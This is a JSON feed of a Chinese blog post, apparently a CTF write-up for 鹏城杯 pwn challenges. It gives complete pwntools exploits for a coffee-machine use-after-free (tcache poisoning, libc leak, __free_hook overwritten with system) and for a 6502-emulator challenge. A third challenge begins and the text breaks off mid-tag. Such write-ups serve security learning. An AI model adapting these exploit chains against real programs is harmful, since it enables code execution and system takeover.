{
    "version": "https://jsonfeed.org/version/1",
    "title": "0110 0011 0111 1001 0110 0010 • All posts by \"how2heap\" tag",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/11/04/pwn/%E5%88%B7%E9%A2%98/%E9%B9%8F%E5%9F%8E%E6%9D%AF/%E9%B9%8F%E5%9F%8E%E6%9D%AF/",
            "url": "https://vvwwvv.cn/2023/11/04/pwn/%E5%88%B7%E9%A2%98/%E9%B9%8F%E5%9F%8E%E6%9D%AF/%E9%B9%8F%E5%9F%8E%E6%9D%AF/",
            "title": "鹏城杯",
            "date_published": "2023-11-04T11:23:15.000Z",
            "content_html": "<h1 id=\"1pwn-auto_coffee_machine\"><a class=\"anchor\" href=\"#1pwn-auto_coffee_machine\">#</a> 1.Pwn-Auto_Coffee_machine</h1>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/%24Z%40%25%5BJ_%5B5E%29V590%29H%60OB%25OD.png\" alt=\"\" /></p>\n<h2 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h2>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      No PIE (0x400000)\n</code></pre>\n<p>没有开启 pie</p>\n<p>想要进入 admin 里要输入一个密码，我们输入的密码会被加密一下：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/QT%7B4%252WNT%401ABD%25%5D%29%60ECFSJ.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/X%60WE%7E%600GM%24%60ONJ0COC3PX2A.png\" alt=\"\" /></p>\n<p>所以我们要输入 <code>lwuv&quot;ryp&quot;kv</code>  字符串每个 <code>ASCII码减-2</code> （最后输入的是 <code>just pwn it</code> ）然后就可以进入 admin</p>\n<p>在 admin 内有两个函数 <code>replenish()</code>  和 <code>change_default()</code></p>\n<p>主要漏洞存在于进入 admin 模式的 <code>change_default</code>  函数，replenish 函数是有对 left_coffee 进行复制的：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/2QDL9XXUBVI%29T4RAEMPSDHR.png\" alt=\"\" /></p>\n<p><code>copy_left_coffee</code>  没有对 <code>left_coffee</code>  进行复制，导致存在 <code>UAF</code>  漏洞：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/%29JI%7D3%7BL3H66R921SNYRNO3P.png\" alt=\"\" /></p>\n<p>所以思路是先通过 sell 两个 id 1 的 <code>coffee</code> ，然后通过 <code>change_default</code>  修改释放的 chunk 的 fd 指针指向 <code>copy_left_coffee</code> ，但是这里会执行 <code>update(2)</code> ，即 <code>copy_left_coffee</code>  没有空的地方，导致无法直接执行 replenish 申请到 <code>copy_left_coffee</code>  附近的 <code>chunk</code> 。所以直接 <code>sell</code>  7 个 id 2 的 coffee，再执行 <code>replenish</code>  申请 7 个 id 2 的 coffee，第 7 个 <code>chunk</code>  就是 <code>copy_left_coffee</code>  附近的 chunk。接下来通过 change 修改 copy_left_coffee 里的一个指针指向 <code>coffee_list</code> ，修改其值为 <code>free_got</code> ，通过 <code>show_list</code>  就可以泄露 libc 地址，在通过 change 修改 <code>free_hook</code>  为 system，并写入一个 <code>chunk “/bin/sh”</code>  字符串，sell 该 <code>chunk</code>  即可获取 shell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>o<span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"172.10.0.9\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">8888</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc-2.31.so\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sell</span><span class=\"token punctuation\">(</span>id1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\">>>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"input the id of what coffee you want to buy\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>id1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Do you want to add something?Y/N\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'N'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show_list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\">>>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">admin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\">>>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'4421'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"please input the admin password\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"just pwn it\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">repl</span><span class=\"token punctuation\">(</span>id1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\">>>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\">>>\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>id1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span>id1<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\">>>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\">>>\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>id1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\">>>\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"input your content\\n\"</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    o<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\">>>\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sell<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sell<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>admin<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>change<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4063C0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>back<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    sell<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>admin<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    repl<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>change<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4062F0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>change<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x406018</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>back<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>show_list<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>o<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'1.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>free_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b\"\\x00\\x00\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>free_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>libc_base <span class=\"token operator\">=</span> free_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sys_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>free_hook <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>admin<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>change<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>change<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>change<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"/bin/sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>back<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>sell<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>o<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/P%40O%29UIQA%24%28M%7DYHZJQMB%5DMWF.png\" alt=\"\" /></p>\n<h1 id=\"26502\"><a class=\"anchor\" href=\"#26502\">#</a> 2.6502</h1>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/FLWHQ8SD%5DH%5D4_TL%5B9SP5PBE.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/264246CKIZ%255%5B0BTVH%40AS0Q.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#p=process(\"./6502_proccessor\")</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'172.10.0.7'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10002</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>system_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>offset<span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>puts_addr <span class=\"token operator\">-</span> system_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>lda <span class=\"token operator\">=</span> <span class=\"token number\">0xAD</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>adc <span class=\"token operator\">=</span> <span class=\"token number\">0x69</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sta <span class=\"token operator\">=</span> <span class=\"token number\">0x8D</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>borrow <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 01 10 11</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>li <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>p8<span class=\"token punctuation\">(</span>lda<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">8462</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p8<span class=\"token punctuation\">(</span>adc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p8<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>offset<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p8<span class=\"token punctuation\">(</span>sta<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">8462</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p8<span class=\"token punctuation\">(</span>lda<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">8462</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p8<span class=\"token punctuation\">(</span>adc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p8<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>offset<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>borrow<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p8<span class=\"token punctuation\">(</span>sta<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">8462</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p8<span class=\"token punctuation\">(</span>lda<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">8462</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p8<span class=\"token punctuation\">(</span>adc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p8<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>offset<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>borrow<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p8<span class=\"token punctuation\">(</span>sta<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">8462</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>li<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'code length: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">'code: \\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/0%5BZ03%40K%25JA%28D%5BN%28K%40%24N9D%40B.png\" alt=\"\" /></p>\n<h1 id=\"3pwn-silent\"><a class=\"anchor\" href=\"#3pwn-silent\">#</a> 3.Pwn-silent</h1>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/AZP%244Q%5DU37L%7BL0K%60HJRA_%7EM.png\" alt=\"\" /></p>\n<p>没有开 canary，意味着可以进行栈溢出</p>\n<p><img 